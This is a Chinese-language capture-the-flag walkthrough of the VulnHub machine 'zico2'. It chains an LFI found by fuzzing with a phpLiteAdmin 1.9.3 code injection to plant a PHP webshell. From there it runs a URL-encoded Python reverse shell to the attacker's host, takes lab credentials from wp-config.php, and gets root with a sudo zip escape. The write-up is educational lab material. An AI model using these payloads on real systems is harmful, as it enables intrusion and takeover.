# zico2: 1

2024-4-28 https://www.vulnhub.com/entry/zico2-1,210/

difficulty: Intermediate

## IP

192.168.5.23

## Scan

Open Port -> 22,80,111,54668

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 6860dec22bc616d85b88bee3cca12575 (DSA)
|   2048 50db75ba112f43c9ab14406d7fa1eee3 (RSA)
|_  256 115d55298a77d808b4009ba36193fee5 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Zico's Shop
|_http-server-header: Apache/2.2.22 (Ubuntu)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35358/tcp6  status
|   100024  1          36162/udp6  status
|   100024  1          54668/tcp   status
|_  100024  1          55437/udp   status
54668/tcp open  status  1 (RPC #100024)
```

22 端口不允许匿名登陆，无其他提示信息。

对 80 web 端口进行端口扫描，发现页面 http://192.168.5.23/view，但是是一个空页面，可能是需要参数某些参数才能显示出一些内容，进行FUZZ测试：

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.5.23/view?FUZZ=index.html -fs 0
```

参数说明：index.html 是跟 view.php 同一个目录下的文件，网站的主页面真实存在，过滤返回 size 为 0 的信息，最终得到了参数名：page，访问 http://192.168.5.23/view?page=index.html 我们看到了主页的内容，证明存在 LFI 漏洞，让我们继续看看还能访问到系统哪些内部文件。

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u http://192.168.5.23/view?page=FUZZ -fs 0
```

得到 curl http://192.168.5.23/view?page=../../../etc/passwd 能访问 /etc/passwd，但是必须加几个 ../ 跳跃到上一级才行，应该是 php 程序中做了目录限制，这时 php 包装器也不能使用，无法看到 viwe.php 的源代码。看到 /etc/passwd 中有一个名为：zico 的用户。

目录扫描发现另一个页面链接 http://192.168.5.23/dbadmin/test_db.php ，版本 v1.9.3

在 RCE 之前，我们先要获取到密码，登陆到后台页面，经过查找，默认密码为：admin，尝试登陆成功。

先看看数据库中默认有什么信息，/usr/databases/test_users 中有一个表 info ，里面有 2 条数据：

```
root	653F4B285089453FE00E2AAFAC573414	1
zico	96781A607F4E9F5F423AC01F0DAB0EBD	2
```

看上去是 2 个用户和相应的密码，密码像是 MD5，在网络上尝试找到明文密码：root:34kroot34，zico:zico2215@

尝试用得到的 2 个用户凭据，登陆 ssh，但是登陆都失败，看来这个方向不对。

经过 searchsploit 发现存在相关漏洞，改为尝试下面的 RCE 方法：

```
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection | php/webapps/24044.txt
```

但是在操作过程中发现新建的数据库文件是存储在 /usr/databases/ 目录下，不是直接存放在 /var/www/html 路径中，不能直接访问执行 php 后门代码。

相当于 php 后门代码写入到了某个目录下，但是不能通过 web 直接去访问，想到前面发现的 LFI 漏洞，把这两个漏洞结合起来使用，应该就能执行 PHP RCE 了。

创建一个 shell 的数据库，里面创建一个 shell 表，就 1 列为 text 类型，插入一行数据值为 `<?php system($_GET["cmd"]);>`，然后使用下面的链接进行验证后门是否写入成功：

```
curl "http://192.168.5.23/view?page=../../../../usr/databases/shell&cmd=id" --output -

SQLite format 3@
tableshellshellCREATE TABLE 'shell' ('cmd' TEXT default 'AAAAuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

可以看到，我们的 php 代码已经执行了，先查看下目标机器上是否有 python：

```
curl "http://192.168.5.23/view?page=../../../../usr/databases/shell&cmd=which+python" --output -
/usr/bin/python
```

使用 nc 执行我们的反弹命令，要对 python 连接命令先进行 url 编码：

```
curl "http://192.168.5.23/view?page=../../../../usr/databases/shell&cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.5.10%22%2C8888%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fsh%22%29%27" --output -
```

在 kali 上监听 8888 端口，我们得到了反弹的 shell，先升级 tty。

在 /home/zico 目录中，看到 to_do.txt 文件，应该是个提示文件，看看里面什么内容：

```
try list:
- joomla
- bootstrap (+phpliteadmin)
- wordpress
```

应该是告诉我们去哪些目录下去寻找有用信息，对这几个目录进行关键文件查看。

看到 wordpress/wp-config.php 中的内容：

```
define('DB_NAME', 'zico');
define('DB_USER', 'zico');
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
```

尝试用次密码切换到 zico，成功切换到该用户。看看 zico 用户有什么特权：

```
sudo -l

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

可以使用 zip 进行提权：

```
TF=$(mktemp -u)
sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'

# id
uid=0(root) gid=0(root) groups=0(root)

# cat flag.txt
#
# ROOOOT!
# You did it! Congratz!
#
# Hope you enjoyed!
#
```
